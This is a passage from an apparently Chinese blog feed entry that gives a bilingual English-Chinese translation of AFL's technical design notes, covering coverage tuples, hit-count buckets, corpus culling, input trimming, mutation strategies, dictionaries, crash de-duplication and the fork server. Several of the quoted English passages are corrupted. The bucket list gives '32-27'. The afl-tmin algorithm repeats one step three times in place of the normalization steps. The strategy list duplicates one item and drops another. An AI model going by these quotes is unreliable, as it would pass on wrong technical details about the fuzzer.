execution trace containing new tuples, the<br>corresponding input file is preserved and routed for additional processing<br>later on (see section #3). Inputs that do not trigger new local-scale state<br>transitions in the execution trace (i.e., produce no new tuples) are discarded,<br>even if their overall control flow sequence is unique.</p></blockquote><p>当变异的输入产生包含新元组的程序执行流时，相应的输入文件将被保留并以供稍后进行其他处理（请参阅第 #3 节）。在执行跟踪中，不触发新的局部规模状态转换（即不产生新元组）的输入将被丢弃，即使它们的总体控制流序列是唯一的</p><blockquote><p>This approach allows for a very fine-grained and long-term exploration of<br>program state while not having to perform any computationally intensive and<br>fragile global comparisons of complex execution traces, and while avoiding the<br>scourge of path explosion.</p></blockquote><p>这种方法允许对程序状态进行非常细粒度和长期的探索，而不必对复杂的执行跟踪执行任何计算密集型和脆弱的全局比较，同时避免路径爆炸的危害。</p><blockquote><p>To illustrate the properties of the algorithm, consider that the second trace<br>shown below would be considered substantially new because of the presence of<br>new tuples (CA, AE):</p></blockquote><p>为了说明该算法的属性，请考虑由于新元组（CA、AE）的存在，下面显示的第二条轨迹将被视为实质上是新的：</p><ul><li>#1:A -&gt; B -&gt; C -&gt; D -&gt; E </li><li>#2:    A -&gt; B -&gt; C -&gt; A -&gt; E</li></ul><blockquote><p>At the same time, with #2 processed, the following pattern will not be seen<br>as unique, despite having a markedly different overall execution path:</p></blockquote><p>同时，若保存#2路径后，尽管下面的例子整体执行路径明显不同，但将不会被视为一个新的路径：</p><ul><li>#3:A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E</li></ul><blockquote><p>In addition to detecting new tuples, the fuzzer also considers coarse tuple<br>hit counts. These are divided into several buckets:</p></blockquote><p>除了检测新元组之外，模糊器还考虑粗元组命中计数。这些被分为几个buckets:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span><span class="hljs-number">-7</span>, <span class="hljs-number">8</span><span class="hljs-number">-15</span>, <span class="hljs-number">16</span><span class="hljs-number">-31</span>, <span class="hljs-number">32</span><span class="hljs-number">-27</span>, <span class="hljs-number">128</span>+<br></code></pre></td></tr></table></figure><blockquote><p>To some extent, the number of buckets is an implementation artifact: it allows<br>an in-place mapping of an 8-bit counter generated by the instrumentation to<br>an 8-position bitmap relied on by the fuzzer executable to keep track of the<br>already-seen execution counts for each tuple.</p></blockquote><p>从某种意义上讲，这些buckets的数量是一种执行工具：它允许将生成的 8 位计数器就地映射到fuzzer执行器所依赖的 8 位位图，以跟踪已经看到的数据每个元组的执行计数</p><blockquote><p>Changes within the range of a single bucket are ignored; transition from one<br>bucket to another is flagged as an interesting change in program control flow,<br>and is routed to the evolutionary process outlined in the section below.</p></blockquote><p>单个bucket范围内的变化会被忽略掉；然而元组从一个bucket到另一个bucket的转换会被标记为程序控制流中的一个有趣的变化，然后会被保存下来传递至下一轮的演化过程中去。</p><blockquote><p>The hit count behavior provides a way to distinguish between potentially<br>interesting control flow changes, such as a block of code being executed<br>twice when it was normally hit only once. At the same time, it is fairly<br>insensitive to empirically less notable changes, such as a loop going from<br>47 cycles to 48. The counters also provide some degree of “accidental”<br>immunity against tuple collisions in dense trace maps.</p></blockquote><p>命中计数行为提供了一种区分潜在的有趣的控制流变换的方法，例如，通常只命中一次的代码块被执行了两次。同时，它对通常经验上不太显着的变化相当不敏感，例如从 47 个周期变为 48 个周期的循环。计数器还提供一定程度的“意外”免疫力，防止密集流映射中的元组碰撞</p><blockquote><p>The execution is policed fairly heavily through memory and execution time<br>limits; by default, the timeout is set at 5x the initially-calibrated<br>execution speed, rounded up to 20 ms. The aggressive timeouts are meant to<br>prevent dramatic fuzzer performance degradation by descending into tarpits<br>that, say, improve coverage by 1% while being 100x slower; we pragmatically<br>reject them and hope that the fuzzer will find a less expensive way to reach<br>the same code. Empirical testing strongly suggests that more generous time<br>limits are not worth the cost.</p></blockquote><p>通过内存和执行时间对执行过程进行相当严格的限制；默认情况下，超时设置为初始校准执行速度的 5 倍，大约为 20 毫秒。激进的超时限制是为了，防止模糊器性能因陷入某种”陷阱“而急剧下降，例如，将覆盖率提高 1%，同时速度慢 100 倍；我们一定会拒绝这种方法，并希望fuzzer能够找到一种代价更低的方式的方法来达到相同的代码块。同时，实证检验也非常强烈地表明，更宽松的时间限制是不值得的。</p><h2 id="3）Evolving-the-input-queue-改进输入队列"><a href="#3）Evolving-the-input-queue-改进输入队列" class="headerlink" title="3）Evolving the input queue 改进输入队列"></a>3）Evolving the input queue 改进输入队列</h2><blockquote><p>Mutated test cases that produced new state transitions within the program are<br>added to the input queue and used as a starting point for future rounds of<br>fuzzing. They supplement, but do not automatically replace, existing finds.</p></blockquote><p>在程序中产生新状态转换的变异测试用例被添加到输入队列中，并用作未来几轮模糊测试的起点。它们补充但不会自动取代现有发现地路径。</p><blockquote><p>In contrast to more greedy genetic algorithms, this approach allows the tool<br>to progressively explore various disjoint and possibly mutually incompatible<br>features of the underlying data format, as shown in this image:</p></blockquote><p>与更贪婪的遗传算法相比，这种方法允许工具逐步探索各种不相交且可能相互不兼容地特征的底层数据格式，如下图所示:</p><p><img src="/img/article/fuzzdoc/afl_gzip.png" alt="afl"></p><p>这里讨论该算法结果的几个实际示例：</p><ul><li><a href="http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html">http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html</a></li><li><a href="http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html">http://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html</a></li></ul><blockquote><p>The synthetic corpus produced by this process is essentially a compact<br>collection of “hmm, this does something new!” input files, and can be used to<br>seed any other testing processes down the line (for example, to manually<br>stress-test resource-intensive desktop apps).</p></blockquote><p>此过程生成的合成语料库本质上是，“嗯，多了一些新的东西！”这样的输入文件的紧凑集合，并且可用于为任何其他测试流程提供种子（例如，手动对资源密集型桌面应用程序进行压力测试）</p><blockquote><p>With this approach, the queue for most targets grows to somewhere between 1k<br>and 10k entries; approximately 10-30% of this is attributable to the discovery<br>of new tuples, and the remainder is associated with changes in hit counts</p></blockquote><p>通过这种方法，大多数目标的队列会增长到 1k 到 10k 条目之间；其中大约 10-30% 归因于新元组的发现，其余部分与命中计数的变化有关。</p><blockquote><p>The following table compares the relative ability to discover file syntax and<br>explore program states when using several different approaches to guided<br>fuzzing. The instrumented target was GNU patch 2.7.3 compiled with -O3 and<br>seeded with a dummy text file; the session consisted of a single pass over the<br>input queue with afl-fuzz:</p></blockquote><p>下表比较了使用几种不同方法进行引导模糊测试时发现文件语法和探索程序状态的相对能力。检测的目标是使用 -O3 编译的 GNU 补丁 2.7.3，并使用虚拟文本文件作为种子；该会话由 afl-fuzz 单次传递的输入队列组成：</p><table><thead><tr><th align="center">Fuzzer guidance strategy used</th><th align="center">Blocks reached</th><th align="center">Edges reached</th><th align="center">Edge hit cnt var</th><th align="center">Highest-coverage test case generated</th></tr></thead><tbody><tr><td align="center">(Initial file)</td><td align="center">156</td><td align="center">163</td><td align="center">1.00</td><td align="center">(none)</td></tr><tr><td align="center">Blind fuzzing S</td><td align="center">182</td><td align="center">205</td><td align="center">2.23</td><td align="center">First 2 B of RCS diff</td></tr><tr><td align="center">Blind fuzzing L</td><td align="center">228</td><td align="center">265</td><td align="center">2.23</td><td align="center">First 4 B of -c mode diff</td></tr><tr><td align="center">Block coverage</td><td align="center">855</td><td align="center">1,130</td><td align="center">1.57</td><td align="center">Almost-valid RCS diff</td></tr><tr><td align="center">Edge coverage</td><td align="center">1,452</td><td align="center">2,070</td><td align="center">2.18</td><td align="center">One-chunk -c mode diff</td></tr><tr><td align="center">AFL model</td><td align="center">1,765</td><td align="center">2,597</td><td align="center">4.99</td><td align="center">Four-chunk -c mode diff</td></tr></tbody></table><blockquote><p>The first entry for blind fuzzing (“S”) corresponds to executing just a single<br>round of testing; the second set of figures (“L”) shows the fuzzer running in a<br>loop for a number of execution cycles comparable with that of the instrumented<br>runs, which required more time to fully process the growing queue.</p></blockquote><p>blind fuzzing（“S”）的第一个条目对应于仅执行一轮测试；第二组图（“L”）显示模糊器在循环中运行的执行周期数与检测运行的运行周期相当，这需要更多时间来完全处理不断增长的队列。</p><blockquote><p>Roughly similar results have been obtained in a separate experiment where the<br>fuzzer was modified to compile out all the random fuzzing stages and leave just<br>a series of rudimentary, sequential operations such as walking bit flips.<br>Because this mode would be incapable of altering the size of the input file,<br>the sessions were seeded with a valid unified diff:</p></blockquote><p>在另一个实验中获得了大致相似的结果，其中模糊器被修改为编译出所有随机模糊阶段，只留下一系列基本的顺序操作，例如步行位翻转。由于此模式无法更改输入文件的大小，会话使用有效的统一差异设定种子：</p><table><thead><tr><th align="center">Queue extension strategy used</th><th align="center">Blocks reached</th><th align="center">Edages reached</th><th align="center">Edge hit cnt var</th><th align="center">Number of unique crashes found</th></tr></thead><tbody><tr><td align="center">(Initial file)</td><td align="center">624</td><td align="center">717</td><td align="center">1.00</td><td align="center">-</td></tr><tr><td align="center">Blind fuzzing</td><td align="center">1,101</td><td align="center">1,409</td><td align="center">1.60</td><td align="center">0</td></tr><tr><td align="center">Block coverage</td><td align="center">1,255</td><td align="center">1,649</td><td align="center">1.48</td><td align="center">0</td></tr><tr><td align="center">Edge coverage</td><td align="center">1,259</td><td align="center">1,734</td><td align="center">1.72</td><td align="center">0</td></tr><tr><td align="center">AFL model</td><td align="center">1,452</td><td align="center">2,040</td><td align="center">3.16</td><td align="center">1</td></tr></tbody></table><blockquote><p>At noted earlier on, some of the prior work on genetic fuzzing relied on<br>maintaining a single test case and evolving it to maximize coverage. At least<br>in the tests described above, this “greedy” approach appears to confer no<br>substantial benefits over blind fuzzing strategies.</p></blockquote><p>如前所述，之前的一些遗传模糊测试工作依赖于维护单个测试用例并对其进行改进以最大化覆盖范围。至少在上述测试中，这种“贪婪”方法似乎并没有比盲目模糊测试策略带来实质性的好处。</p><h2 id="4）Culling-the-corpus-语料库剔除"><a href="#4）Culling-the-corpus-语料库剔除" class="headerlink" title="4）Culling the corpus 语料库剔除"></a>4）Culling the corpus 语料库剔除</h2><blockquote><p>The progressive state exploration approach outlined above means that some of<br>the test cases synthesized later on in the game may have edge coverage that<br>is a strict superset of the coverage provided by their ancestors.</p></blockquote><p>上面概述的渐进状态探索方法意味着，在流程中稍后合成的一些测试用例可能具有边缘覆盖，这是其祖先提供的覆盖的严格超集。</p><blockquote><p>To optimize the fuzzing effort, AFL periodically re-evaluates the queue using a<br>fast algorithm that selects a smaller subset of test cases that still cover<br>every tuple seen so far, and whose characteristics make them particularly<br>favorable to the tool.</p></blockquote><p>为了优化模糊测试工作，AFL 使用快速算法定期重新评估队列，该算法选择较小的测试用例子集，这些测试用例仍然覆盖迄今为止看到的每个元组，并且其特征使它们特别适合该工具。</p><blockquote><p>The algorithm works by assigning every queue entry a score proportional to its<br>execution latency and file size; and then selecting lowest-scoring candidates<br>for each tuple.</p></blockquote><p>该算法的工作原理是为每个队列条目分配与其执行延迟和文件大小成比例的分数;然后为每个元组选择得分最低的候选项。</p><blockquote><p>The tuples are then processed sequentially using a simple workflow:</p><ol><li>Find next tuple not yet in the temporary working set,</li><li>Locate the winning queue entry for this tuple,</li><li>Register <strong>all</strong> tuples present in that entry’s trace in the working set,</li><li>Go to #1 if there are any missing tuples in the set.</li></ol></blockquote><p>然后使用一种简易的流程处理这些元组：</p><ol><li>找到一个未在临时工作集中的元组</li><li>找到这个元组的winning队列条目</li><li>在工作集中注册该条目的<strong>所有</strong>存在的元组</li><li>如果在集合里有任何缺少的元组，返回流程1</li></ol><blockquote><p>The generated corpus of “favored” entries is usually 5-10x smaller than the<br>starting data set. Non-favored entries are not discarded, but they are skipped<br>with varying probabilities when encountered in the queue:</p><ul><li><p>If there are new, yet-to-be-fuzzed favorites present in the queue, 99% of non-favored entries will be skipped to get to the favored ones.</p></li><li><p>If there are no new favorites:</p><ul><li><p>If the current non-favored entry was fuzzed before, it will be skipped 95% of the time.</p></li><li><p>If it hasn’t gone through any fuzzing rounds yet, the odds of skipping drop down to 75%.</p></li></ul></li></ul><p>Based on empirical testing, this provides a reasonable balance between queue </p><p>cycling speed and test case diversity.</p></blockquote><p>生成的”首选”的语料库通常比其实数据集要小 5-10 倍。不受欢迎的条目不会被丢弃，但它们在队列中会以不同概率被跳过：</p><ul><li>如果队列中存在新的、尚未被fuzz的<strong>favorites</strong>，则99%的<strong>non-favored</strong>条目将被跳过，而去访问<strong>favored</strong>条目</li><li>如果不存在新的<strong>favorites</strong>：<ul><li>如果当前<strong>non-favored</strong>条目之前被fuzz过，则有95%的几率跳过</li><li>如果当前<strong>non-favored</strong>条目未被fuzz过，则跳过的几率下降到75%</li></ul></li></ul><p>基于实际测试，这种方式在循环速度和测试用例多样性之间提供了合理的平衡</p><blockquote><p>Slightly more sophisticated but much slower culling can be performed on input<br>or output corpora with afl-cmin. This tool permanently discards the redundant<br>entries and produces a smaller corpus suitable for use with afl-fuzz or<br>external tools.</p></blockquote><p>可以使用 afl-cmin 对输入或输出语料库执行稍微复杂但速度慢得多的剔除。此工具会永久丢弃冗余条目，并生成适合与 afl-fuzz 或外部工具一起使用的较小语料库。</p><h2 id="5）Trimming-input-files-修剪输入文件"><a href="#5）Trimming-input-files-修剪输入文件" class="headerlink" title="5）Trimming input files 修剪输入文件"></a>5）Trimming input files 修剪输入文件</h2><blockquote><p>File size has a dramatic impact on fuzzing performance, both because large<br>files make the target binary slower, and because they reduce the likelihood<br>that a mutation would touch important format control structures, rather than<br>redundant data blocks. This is discussed in more detail in perf_tips.txt.</p></blockquote><p>文件大小对模糊测试性能有显著影响，这既是因为大文件会使目标二进制文件变慢，也是因为它们降低了突变接触重要格式控制结构的可能性，增大了接触冗余数据块的可能性。在perf_tips.txt中将对此问题做更详细地讨论。</p><blockquote><p>The possibility that the user will provide a low-quality starting corpus aside,<br>some types of mutations can have the effect of iteratively increasing the size<br>of the generated files, so it is important to counter this trend.</p></blockquote><p>就算不考虑用户自身提供低质量起始语料库的可能性，某些类型的突变也可能会导致迭代地增加生成文件的大小，因此扭转这种变化趋势非常重要。</p><blockquote><p>Luckily, the instrumentation feedback provides a simple way to automatically<br>trim down input files while ensuring that the changes made to the files have no<br>impact on the execution path.</p></blockquote><p>幸运的是，检测反馈提供了一种简单的方法来自动修剪输入文件，同时确保对文件所做的更改不会影响执行路径。</p><blockquote><p>The built-in trimmer in afl-fuzz attempts to sequentially remove blocks of data<br>with variable length and stepover; any deletion that doesn’t affect the checksum<br>of the trace map is committed to disk. The trimmer is not designed to be<br>particularly thorough; instead, it tries to strike a balance between precision<br>and the number of execve() calls spent on the process, selecting the block size<br>and stepover to match. The average per-file gains are around 5-20%.</p></blockquote><p>afl-fuzz 中的内置修剪器尝试按顺序删除具有可变长度和跨距的数据块;任何不影响跟踪映射校验和的删除都将提交到磁盘。修剪器的设计不是特别彻底；相反，通过选择匹配数据块大小和跨步大小，它试图在精度和进程<code>execve()</code>调用的数量上取得平衡。每个文件的平均收益为5-20%。</p><blockquote><p>The standalone afl-tmin tool uses a more exhaustive, iterative algorithm, and<br>also attempts to perform alphabet normalization on the trimmed files. The<br>operation of afl-tmin is as follows.</p></blockquote><p>独立的 afl-tmin 工具使用更详尽的迭代算法，并且还尝试对修剪后的文件执行字母规范化。afl-tmin的操作如下。</p><blockquote><p>First, the tool automatically selects the operating mode. If the initial input<br>crashes the target binary, afl-tmin will run in non-instrumented mode, simply<br>keeping any tweaks that produce a simpler file but still crash the target. If<br>the target is non-crashing, the tool uses an instrumented mode and keeps only<br>the tweaks that produce exactly the same execution path.</p></blockquote><p>首先，该工具会自动选择操作模式。如果初始输入使目标二进制文件崩溃，afl-tmin 将以非检测模式运行，只需保留生成更简单文件但仍会使目标崩溃的任何调整。如果目标未崩溃，则该工具使用检测模式，并仅保留生成完全相同执行路径的调整。</p><blockquote><p>The actual minimization algorithm is:</p><ol><li>Attempt to zero large blocks of data with large stepovers. Empirically, this is shown to reduce the number of execs by preempting finer-grained efforts later on.</li><li>Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style.</li><li>Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style.</li><li>Perform a block deletion pass with decreasing block sizes and stepovers, binary-search-style.</li></ol></blockquote><p>实际的最小化算法是：</p><ol><li>尝试将具有大跨距的大数据块归零。从经验上讲，这可以通过抢占以后更细粒度的工作来减少<code>exec</code>的数量。</li><li>以递减的块大小和步距执行块删除过程，采用二分搜索方式。</li><li>通过计算唯一字符并尝试将每个字符批量替换为零值来执行字母规范化。</li><li>最后，对非零字节执行逐字节归一化。</li></ol><blockquote><p>Instead of zeroing with a 0x00 byte, afl-tmin uses the ASCII digit ‘0’. This<br>is done because such a modification is much less likely to interfere with<br>text parsing, so it is more likely to result in successful minimization of<br>text files.</p></blockquote><p>afl-tmin 使用 ASCII 数字“0”，而不是使用 0x00 字节进行清零。这样做是因为这样的修改不太可能干扰文本解析，因此更有可能成功最小化文本文件。</p><blockquote><p>The algorithm used here is less involved than some other test case<br>minimization approaches proposed in academic work, but requires far fewer<br>executions and tends to produce comparable results in most real-world<br>applications.</p></blockquote><p>这里使用的算法比学术工作中提出的其他一些测试用例最小化方法涉及的程度要少，但需要的执行次数要少得多，并且往往会在大多数实际应用中产生可比较的结果。</p><h2 id="6）-Fuzzing-strategies-模糊测试策略"><a href="#6）-Fuzzing-strategies-模糊测试策略" class="headerlink" title="6） Fuzzing strategies 模糊测试策略"></a>6） Fuzzing strategies 模糊测试策略</h2><blockquote><p>The feedback provided by the instrumentation makes it easy to understand the<br>value of various fuzzing strategies and optimize their parameters so that they<br>work equally well across a wide range of file types. The strategies used by<br>afl-fuzz are generally format-agnostic and are discussed in more detail here:<br><a href="http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html">http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html</a></p></blockquote><p>仪器提供的反馈使您可以轻松了解各种模糊测试策略的价值并优化其参数，以便它们在各种文件类型上同样有效。 afl-fuzz 使用的策略通常与格式无关，这里更详细地讨论:<br><a href="http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html">http://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html</a></p><blockquote><p>It is somewhat notable that especially early on, most of the work done by<br>afl-fuzz is actually highly deterministic, and progresses to random stacked<br>modifications and test case splicing only at a later stage. The deterministic<br>strategies include:</p></blockquote><ul><li>Sequential bit flips with varying lengths and stepovers,</li><li>Sequential addition and subtraction of small integers,</li><li>Sequential addition and subtraction of small integers,</li></ul><p>值得注意的是，特别是在早期，afl-fuzz 所做的大部分工作实际上是高度确定性的，并且仅在后期阶段才会进展到随机堆叠修改和测试用例拼接。确定性策略包括：</p><ul><li>顺序对不同长度和步距的位进行反转</li><li>顺序对小整数的加减法</li><li>顺序插入已知的interesting整数（0、1、INT_MAX等）</li></ul><blockquote><p>The purpose of opening with deterministic steps is related to their tendency to<br>produce compact test cases and small diffs between the non-crashing and crashing<br>inputs.</p></blockquote><p>以确定性步骤打开的目的与它们生成紧凑测试用例以及非崩溃和崩溃输入之间的小差异的倾向有关。</p><blockquote><p>With deterministic fuzzing out of the way, the non-deterministic steps include<br>stacked bit flips, insertions, deletions, arithmetics, and splicing of different<br>test cases.</p></blockquote><p>介绍完确定性模糊测试步骤，非确定性步骤包括堆叠位翻转、插入、删除、算术和不同测试用例的拼接。</p><blockquote><p>The relative yields and execve() costs of all these strategies have been<br>investigated and are discussed in the aforementioned blog post.</p></blockquote><p>所有这些策略的相对收益率和 <code>execve()</code>的成本都已在上述博客文章中进行了研究和讨论。</p><blockquote><p>For the reasons discussed in historical_notes.txt (chiefly, performance,<br>simplicity, and reliability), AFL generally does not try to reason about the<br>relationship between specific mutations and program states; the fuzzing steps<br>are nominally blind, and are guided only by the evolutionary design of the<br>input queue.</p></blockquote><p>正如 Historical_notes.txt 中讨论的原因（主要是性能、简单性和可靠性），AFL 通常不会尝试推理特定突变和程序状态之间的关系；模糊测试步骤名义上是盲目的，并且仅受输入队列的进化设计的指导。</p><blockquote><p>That said, there is one (trivial) exception to this rule: when a new queue<br>entry goes through the initial set of deterministic fuzzing steps, and tweaks to<br>some regions in the file are observed to have no effect on the checksum of the<br>execution path, they may be excluded from the remaining phases of<br>deterministic fuzzing - and the fuzzer may proceed straight to random tweaks.<br>Especially for verbose, human-readable data formats, this can reduce the number<br>of execs by 10-40% or so without an appreciable drop in coverage. In extreme<br>cases, such as normally block-aligned tar archives, the gains can be as high as<br>90%.</p></blockquote><p>也就是说，此规则有一个（微不足道的）例外：当新队列条目经历初始的一组确定性模糊步骤时，观察到对文件中某些区域的调整对执行路径的校验和没有影响，它们可能会被排除在确定性模糊测试的剩余阶段之外 - 并且模糊器可能会直接进行随机调整。特别是对于冗长的、人类可读的数据格式，这可以将执行数量减少 10-40% 左右，而覆盖率不会明显下降。在极端情况下，例如通常块对齐的 tar 存档，增益可高达 90%。</p><blockquote><p>Because the underlying “effector maps” are local every queue entry and remain<br>in force only during deterministic stages that do not alter the size or the<br>general layout of the underlying file, this mechanism appears to work very<br>reliably and proved to be simple to implement.</p></blockquote><p>由于底层“效应器映射”是每个队列条目的本地信息，并且仅在不改变底层文件的大小或总体布局的确定性阶段保持有效，因此该机制似乎工作非常可靠，并且被证明易于实现。</p><h2 id="7）Dictionaries-字典"><a href="#7）Dictionaries-字典" class="headerlink" title="7）Dictionaries 字典"></a>7）Dictionaries 字典</h2><blockquote><p>The feedback provided by the instrumentation makes it easy to automatically<br>identify syntax tokens in some types of input files, and to detect that certain<br>combinations of predefined or auto-detected dictionary terms constitute a<br>valid grammar for the tested parser.</p></blockquote><p>仪器提供的反馈使得自动识别某些类型的输入文件中的语法标记变得容易，并检测预定义或自动检测的字典术语的某些组合是否构成了测试解析器的有效语法。</p><p>有关如何在 afl-fuzz 中实现这些功能的讨论可以在此处找到:<br><a href="http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html">http://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html</a></p><blockquote><p>In essence, when basic, typically easily-obtained syntax tokens are combined<br>together in a purely random manner, the instrumentation and the evolutionary<br>design of the queue together provide a feedback mechanism to differentiate<br>between meaningless mutations and ones that trigger new behaviors in the<br>instrumented code - and to incrementally build more complex syntax on top of<br>this discovery.</p></blockquote><p>本质上，当基本的、通常容易获得的语法标记以纯粹随机的方式组合在一起时，队列的检测和进化设计一起提供了一种反馈机制，以区分无意义的突变和在检测代码中触发新行为的突变- 并在此发现的基础上逐步构建更复杂的语法。</p><blockquote><p>The dictionaries have been shown to enable the fuzzer to rapidly reconstruct<br>the grammar of highly verbose and complex languages such as JavaScript, SQL,<br>or XML; several examples of generated SQL statements are given in the blog<br>post mentioned above.</p></blockquote><p>事实证明，字典可以使模糊器快速重建高度冗长和复杂的语言（例如 JavaScript、SQL 或 XML）的语法；上面提到的博客文章中给出了生成 SQL 语句的几个示例。</p><blockquote><p>Interestingly, the AFL instrumentation also allows the fuzzer to automatically<br>isolate syntax tokens already present in an input file. It can do so by looking<br>for run of bytes that, when flipped, produce a consistent change to the<br>program’s execution path; this is suggestive of an underlying atomic comparison<br>to a predefined value baked into the code. The fuzzer relies on this signal<br>to build compact “auto dictionaries” that are then used in conjunction with<br>other fuzzing strategies.</p></blockquote><p>有趣的是，AFL 检测还允许模糊器自动隔离输入文件中已存在的语法标记。它可以通过查找字节运行来实现这一点，这些字节在翻转时会对程序的执行路径产生一致的更改；这表明代码中预定义值存在底层原子化的比较。模糊器依靠这个信号来构建紧凑的“自动字典”，然后与其他模糊策略结合使用。</p><h2 id="8）De-duping-crashes-重复数据删除崩溃"><a href="#8）De-duping-crashes-重复数据删除崩溃" class="headerlink" title="8）De-duping crashes 重复数据删除崩溃"></a>8）De-duping crashes 重复数据删除崩溃</h2><blockquote><p>De-duplication of crashes is one of the more important problems for any<br>competent fuzzing tool. Many of the naive approaches run into problems; in<br>particular, looking just at the faulting address may lead to completely<br>unrelated issues being clustered together if the fault happens in a common<br>library function (say, strcmp, strcpy); while checksumming call stack<br>backtraces can lead to extreme crash count inflation if the fault can be<br>reached through a number of different, possibly recursive code paths.</p></blockquote><p>对于任何有能力的模糊测试工具来说，如何删除重复数据是最重要的问题之一。许多简单的方法都会遇到问题。尤其是，如果故障发生在公共库函数（例如 strcmp、strcpy）中，则仅查看故障地址可能会导致完全不相关的问题聚集在一起；如果可以通过许多不同的、可能是递归的代码路径到达故障，则对调用堆栈回溯进行校验和可能会导致大量异常的崩溃计数。</p><blockquote><p>The solution implemented in afl-fuzz considers a crash unique if any of two<br>conditions are met:</p><ul><li>The crash trace includes a tuple not seen in any of the previous crashes,</li><li>The crash trace is missing a tuple that was always present in earlier faults.<br>如果满足下列两个条件的任意一种，afl-fuzz中实现的解决方案就会将其认定为一种crash</li></ul></blockquote><ul><li>若这个crash包含一个从未在其他crash中出现过的元组</li><li>若这个crash不包含一个总是在其他crash中出现的元组</li></ul><blockquote><p>The approach is vulnerable to some path count inflation early on, but exhibits<br>a very strong self-limiting effect, similar to the execution path analysis<br>logic that is the cornerstone of afl-fuzz.</p></blockquote><p>该方法早期容易受到路径计数膨胀的影响，但其表现出非常强的自我限制效应，同样体现在 afl-fuzz 基石的执行路径分析逻辑。</p><h2 id="9）Investigating-crashes-调查崩溃"><a href="#9）Investigating-crashes-调查崩溃" class="headerlink" title="9）Investigating crashes 调查崩溃"></a>9）Investigating crashes 调查崩溃</h2><blockquote><p>The exploitability of many types of crashes can be ambiguous; afl-fuzz tries<br>to address this by providing a crash exploration mode where a known-faulting<br>test case is fuzzed in a manner very similar to the normal operation of the<br>fuzzer, but with a constraint that causes any non-crashing mutations to be<br>thrown away.</p></blockquote><p>许多类型的崩溃的可利用性可能是不明确的； afl-fuzz 试图通过提供崩溃探索模式来解决这个问题，其中已知故障的测试用例以与模糊器正常操作非常相似的方式进行模糊测试，但有一个约束，导致任何非崩溃的突变都被丢弃。</p><p>有关此方法价值的详细讨论可以在此处找到</p><ul><li><a href="http://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html">http://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html</a></li></ul><blockquote><p>The method uses instrumentation feedback to explore the state of the crashing<br>program to get past the ambiguous faulting condition and then isolate the<br>newly-found inputs for human review.</p></blockquote><p>该方法使用仪器反馈来探索崩溃程序的状态，以克服模糊的故障条件，然后隔离新发现的输入以供人工审查。</p><blockquote><p>On the subject of crashes, it is worth noting that in contrast to normal<br>queue entries, crashing inputs are <em>not</em> trimmed; they are kept exactly as<br>discovered to make it easier to compare them to the parent, non-crashing entry<br>in the queue. That said, afl-tmin can be used to shrink them at will.</p></blockquote><p>关于崩溃问题，值得注意的是，与正常队列条目相比，崩溃输入<strong>不会</strong>被修剪；它们完全按照发现的方式保存，以便更容易将它们与队列中的父非崩溃条目进行比较。也就是说，afl-tmin 可以用来随意缩小它们。</p><h2 id="10）The-fork-server"><a href="#10）The-fork-server" class="headerlink" title="10）The fork server"></a>10）The fork server</h2><blockquote><p>To improve performance, afl-fuzz uses a “fork server”, where the fuzzed process<br>goes through execve(), linking, and libc initialization only once, and is then<br>cloned from a stopped process image by leveraging copy-on-write. The<br>implementation is described in more detail here:</p></blockquote><p>为了提高性能，afl-fuzz 使用<strong>“fork server”</strong>，其中模糊化进程仅执行一次 execve()、链接和 libc 初始化，然后通过利用<strong>copy-on-write</strong>从停止的进程映像进行克隆。这里更详细地描述了该实现：</p><ul><li><a href="http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html">http://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html</a></li></ul><blockquote><p>The fork server is an integral aspect of the injected instrumentation and<br>simply stops at the first instrumented function to await commands from<br>afl-fuzz.</p></blockquote><p>fork server是注入检测的一个组成部分，它只是在第一个检测函数处停止以等待来自 afl-fuzz 的命令。</p><blockquote><p>With fast targets, the fork server can offer considerable performance gains,<br>usually between 1.5x and 2x. It is also possible to:</p><ul><li>Use the fork server in manual (“deferred”) mode, skipping over larger, user-selected chunks of initialization code. It requires very modest code changes to the targeted program, and With some targets, can produce 10x+ performance gains.</li><li>Enable “persistent” mode, where a single process is used to try out multiple inputs, greatly limiting the overhead of repetitive fork() calls. This generally requires some code changes to the targeted program, but can improve the performance of fast targets by a factor of 5 or more - approximating the benefits of in-process fuzzing jobs while still maintaining very robust isolation between the fuzzer process and the targeted binary.</li></ul></blockquote><p>对于fast目标，fork server可以提供相当大的性能提升，通常在1.5倍到2倍之间。还可以：</p><ul><li>在手动的（“deferred”）模式下使用fork server，跳过较大的、用户选择的初始化代码块。它需要对目标程序进行恰到好处的代码更改，并且对于某些目标，可以产生10倍以上的性能提升</li><li>启用“persistent”模式，其中单个进程用于尝试多个输入，极大的限制了重复<code>fork()</code>调用的开销。这通常需要对目标程序进行一些代码更改，大可以将fast目标的性能提高5倍或者更多 - 近似于进程内模糊测试作业的好处，同时仍然保持fuzzer进程和目标二进制文件之间巨大的隔离。</li></ul><h2 id="其他部分"><a href="#其他部分" class="headerlink" title="其他部分"></a>其他部分</h2><p>剩下3章感觉不是很重要，可以自己去看看。之后有空再补上这部分吧</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【fuzz trick】利用LCOV测量代码覆盖率</title>
